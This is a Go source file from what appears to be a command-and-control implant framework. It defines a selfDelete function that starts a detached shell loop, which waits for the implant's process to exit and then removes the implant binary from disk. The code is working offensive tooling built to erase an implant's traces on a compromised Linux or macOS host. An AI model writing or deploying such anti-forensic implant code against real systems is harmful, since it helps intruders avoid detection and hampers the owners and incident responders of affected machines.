//go:build darwin || linux

package core

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// selfDelete attempts to delete the implant binary
// On Unix systems, we use a shell command that waits for the process to exit
// and then removes the binary
func (i *Implant) selfDelete() error {
	// Get the path to the current executable
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	// Resolve symlinks to get the real path
	realPath, err := filepath.EvalSymlinks(exePath)
	if err != nil {
		return fmt.Errorf("failed to resolve symlinks: %w", err)
	}

	// Get current process ID
	pid := os.Getpid()

	// Escape single quotes in the path by replacing ' with '\''
	// This allows the path to be safely used within single quotes
	escapedPath := strings.ReplaceAll(realPath, "'", "'\\''")

	// Create a shell command that:
	// 1. Waits for this process to exit by checking if PID exists
	// 2. Then removes the binary
	// We use /bin/sh for maximum compatibility
	deleteCmd := fmt.Sprintf(
		"(while kill -0 %d 2>/dev/null; do sleep 0.1; done; rm -f '%s') >/dev/null 2>&1 &",
		pid,
		escapedPath,
	)

	// Execute the delete command in the background
	cmd := exec.Command("/bin/sh", "-c", deleteCmd)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	// Start the command but don't wait for it
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start self-delete command: %w", err)
	}

	// Detach from the child process
	// This allows the parent process to exit while the child continues
	if err := cmd.Process.Release(); err != nil {
		// Log the error but don't fail the operation
		// The delete command is already running
		return fmt.Errorf("failed to release child process: %w", err)
	}

	return nil
}
